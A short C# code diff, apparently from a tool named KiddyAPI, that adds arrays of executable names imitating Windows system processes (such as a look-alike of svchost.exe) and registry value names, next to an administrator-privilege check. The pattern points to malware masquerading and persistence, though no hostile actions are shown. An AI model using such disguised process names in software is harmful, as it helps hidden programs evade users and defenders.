@@ -19,5 +19,7 @@ namespace KiddyAPI.Protect
         {
             get { return WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.AccountAdministratorSid); }
         }
+        public static string[] FileName = new string[2] { "audiohddddd.exe", "svvvvvvvhost.exe" };
+        public static string[] RegName = new string[2] { "WOOOD", "OHMYGOD" };
     }
 }
